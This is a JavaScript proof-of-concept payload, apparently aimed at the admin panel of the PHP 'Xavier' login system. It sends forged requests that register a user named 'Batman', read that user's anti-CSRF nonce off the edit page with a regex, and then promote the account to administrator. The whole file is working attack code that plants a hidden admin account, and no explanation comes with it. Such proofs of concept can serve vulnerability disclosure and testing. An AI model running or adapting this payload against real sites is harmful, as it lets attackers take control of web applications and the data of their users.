
var root = ""
var req = new XMLHttpRequest();
var url = root + "/xavier-demo/admin/includes/adminprocess.php"
var params = "user=Batman&firstname=Batman&lastname=Batman&pass=SupermanSuperman&conf_pass=SupermanSuperman&email=Batman%40Superman.com&conf_email=Batman%40Superman.com&form_submission=admin_registration"
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
var url2 = root + "/xavier-demo/admin/adminuseredit.php?usertoedit=Batman";
var regex = /delete-user" value="([^"]*?)"/g;
var req2 = new XMLHttpRequest();
req2.open("GET", url2, false);
req2.send();
var nonce = regex.exec(req2.responseText);
var nonce = nonce[1];
var url3 = root + "/xavier-demo/admin/includes/adminprocess.php";
var params2 = "delete-user="+nonce+"&form_submission=delete_user&usertoedit=Batman&button=Promotetoadmin"
req2.open("POST", url3, true);
req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req2.send(params2);
console.log(nonce);
